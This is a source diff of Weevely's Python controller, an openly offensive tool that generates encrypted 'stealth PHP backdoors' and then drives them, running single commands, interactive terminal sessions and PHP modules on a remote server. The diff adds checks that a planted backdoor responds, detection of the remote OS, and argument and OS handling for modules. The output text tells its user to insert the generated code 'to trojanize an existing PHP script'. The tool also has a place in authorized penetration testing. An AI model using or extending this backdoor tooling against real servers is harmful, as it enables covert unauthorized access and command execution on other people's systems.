@@ -7,6 +7,7 @@ import getopt, sys, base64, os, urllib2, re, urlparse, os
 class weevely:
   
   modules = {}
+  os=''
   
   def main(self):
     
@@ -54,6 +55,13 @@ class weevely:
 	  print "! Please specify URL (-u)"
 	  sys.exit(1)
 	  
+	
+	(ret,ret2, e, e2) = self.checkbackdoor(url, pwd)
+	if not ret or not ret2:
+	  print '! Backdoor verification failed: ' + str(e) + '.' 
+	  return
+	os=ret2
+	
       if moderun=='g':
 	if 'outfile' not in locals():
 	  print "! Please specify where generate backdoor file (-o)"
@@ -80,7 +88,7 @@ class weevely:
       if moderun=='g':
 	self.generate(pwd,outfile)
       if moderun=='m':
-	self.execmodule(url,pwd,modul)
+	self.execmodule(url,pwd,modul,os)
       if moderun=='l':
 	self.listmodules()
     else:
@@ -88,27 +96,26 @@ class weevely:
       sys.exit(1)
 
   def usage(self):
-    print """+  Generate backdoor crypted code.
+    print """+ Generate backdoor crypted code.
 +  	./weevely -g -o <filepath> -p <password>
 +      
-+  Command execution
++ Exec single command on remote server.
 +  	./weevely -c <command> -u <url> -p <password>
 +      
-+  Terminal session
++ Start terminal session on remote server.
 +  	./weevely -t -u <url> -p <password>
 +
-+  List available modules
++ List local PHP modules details (available: """ + ", ".join(self.modules) + """).
 +  	./weevely -l
 +
-+  Execute local PHP on remote server, with arguments.
-+  	./weevely -m <module>:<firstarg>:..:<secondarg> -u <url> -p <password>"""
++ Evaluate local PHP modules on remote server, specifing arguments.
++  	./weevely -m <module>::<firstarg>::..::<Narg> -u <url> -p <password>"""
     
   def banner(self):
-    print "+ Weevely - stealth PHP backoor generator and controller.\n+\t\t\tEmilio Pinna & Carlo Satta.\n+"
+    print "+ Weevely - Generate and manage stealth PHP backdoors.\n+"
 
      
   def crypt(self, text, key):
-    #return (($text ^ str_pad("", strlen($text), $key)) & str_repeat("\x1f", strlen($text))) | ($text & str_repeat("\xe0", strlen($text)));
     text = frombuffer( text, dtype=byte )
     firstpad=frombuffer(( key*(len(text)/len(key)) + key)[:len(text)], dtype=byte)
     strrepeat=frombuffer( '\x1f'*len(text), dtype=byte)
@@ -146,21 +153,11 @@ class weevely:
     
     hostname=urlparse.urlparse(url)[1]
     
-    try:
-      ret = self.execute(url, pwd, "echo " + pwd, 0)
-    except Exception, e:
-      print '! Backdoor verification failed: ' + str(e) + '.'
-      return
-    
-    if pwd!=ret:
-      print '! Backdoor verification failed.'
-      return
-    else:
-      while True:
-	print hostname + '> ',
-	cmnd = sys.stdin.readline()
-	if cmnd!='\n':
-	  print self.execute(url, pwd, cmnd, 0)
+    while True:
+      print hostname + '> ',
+      cmnd = sys.stdin.readline()
+      if cmnd!='\n':
+	print self.execute(url, pwd, cmnd, 0)
 
   def generate(self,key,path):
     f_tocrypt = file('php/text_to_crypt.php')
@@ -174,8 +171,8 @@ class weevely:
     
     f_output.write(new_str)
     print '+ Backdoor file ' + path + ' created with password '+ key + '.\n+ Insert the code to trojanize an existing PHP script, or use the PHP file as is. Exiting.'
-     
-  def execmodule(self, url, pwd, modulestring):
+
+  def execmodule(self, url, pwd, modulestring, os):
     
     modname = modulestring.split('::')[0]
     modargs = modulestring.split('::')[1:]
@@ -187,9 +184,16 @@ class weevely:
       if m.has_key('arguments'):
 	argnum=len(self.modules[modname]['arguments'])
 	if len(modargs)!=argnum:
-	  print '! Module', modname, 'takes exactly', argnum, 'arguments.'
+	  print '! Module', modname, 'takes exactly', argnum, 'argument/s:', ','.join(self.modules[modname]['arguments'])
+	  print '! Description:', self.modules[modname]['description']
 	  return
-	  
+       
+      if m.has_key('os'):
+	if os not in self.modules[modname]['os']:
+	  print '- Warning: remote system \'' + os + '\' and module supported system/s \'' + ','.join(self.modules[modname]['os']).strip() + '\' seems not compatible.'
+	  print '- Press enter to continue or control-c to exit'
+	  sys.stdin.readline()
+	
       f = file('modules/' + modname + '.php')
       modargsstring=str(modargs)
       toinject = '$ar=Array(' + modargsstring[1:len(modargsstring)-1] + ');'
@@ -209,16 +213,15 @@ class weevely:
     for n in self.modules.keys():
       m = self.modules[n]
       
-      print '+ Module:', m['name'],
-      if m.has_key('author'):
-	print m['author']
-      else:
-	print ''
-      
+      print '+ Module:', m['name']
+      if m.has_key('OS'):
+	print '+ Supported OSs:', m['OS']
       if m.has_key('description'):
-	print '  Description:', m['description']
+	print '+ Description:', m['description']
       if m.has_key('arguments'):
-	print '  Take', str(len(m['arguments'])), 'argument/s:', ','.join(m['arguments']) + '.'
+	print '+ Take', str(len(m['arguments'])), 'argument/s:', ','.join(m['arguments']) + '.'
+
+      print '+'
   
   def loadmodules(self):
     files = os.listdir('modules')
@@ -250,11 +253,38 @@ class weevely:
 	e = re.compile(restring)
 	founded=e.findall(modstr)
 	if founded:
-	  module['arguments']=founded[0].split(',')
+	  module['arguments'] = [v.strip() for v in founded[0].split(',')]
+
+	restring='//.*OS:(.*)'
+	e = re.compile(restring)
+	founded=e.findall(modstr)
+	if founded:
+	  #module['os']=founded[0].split(',')
+	  module['os'] = [v.strip() for v in founded[0].split(',')]
 
 	self.modules[module['name']]=module
      
-  
+
+  def checkbackdoor(self,url,pwd):
+    
+    e = None
+    e2 = None
+    
+    try:
+      ret = self.execute(url, pwd, "echo " + pwd, 0)
+    except Exception, e:
+      ret = False
+    if pwd != ret:
+      ret = False
+    
+    try:
+      ret2 = self.execute(url, pwd, "echo PHP_OS;", 1)
+    except Exception, e2:
+      ret2 = False
+    if not ret2:
+      ret = False
+    
+    return ret, ret2, e, e2
     
 if __name__ == "__main__":
     
